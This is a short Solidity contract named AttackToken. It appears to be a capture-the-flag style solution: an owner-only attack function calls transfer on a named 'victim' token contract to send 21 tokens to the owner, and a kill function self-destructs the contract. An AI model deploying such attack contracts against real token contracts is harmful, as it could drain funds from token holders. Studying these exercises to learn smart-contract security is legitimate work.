// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Token {
  function transfer(address, uint256) external returns (bool);
}

contract AttackToken {
  address payable internal _owner;
  constructor() {
    _owner = payable(msg.sender);
  }

  modifier onlyOwner {
    require(msg.sender == _owner, "expects to be called by owner");
    _;
  }

  function kill() public onlyOwner {
    selfdestruct(_owner);
  }

  function attack(address victom) public onlyOwner {
    Token(victom).transfer(_owner, 21);
  }
}
